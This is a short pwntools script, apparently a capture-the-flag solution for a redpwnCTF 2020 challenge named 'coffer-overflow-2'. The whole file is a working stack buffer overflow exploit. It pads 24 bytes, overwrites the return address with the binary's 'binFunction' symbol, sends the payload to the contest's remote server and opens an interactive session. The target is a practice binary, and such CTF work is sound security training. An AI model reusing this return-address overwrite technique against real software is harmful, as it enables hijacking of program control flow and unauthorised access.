from pwn import *

elf = ELF('./coffer-overflow-2')

bin_func_addr = elf.symbols['binFunction']
offset = 24

payload = b'A' * offset
payload += p64(bin_func_addr)

#p = process('./coffer-overflow-2')
p = remote('2020.redpwnc.tf', 31908)

p.sendline(payload)
p.interactive()
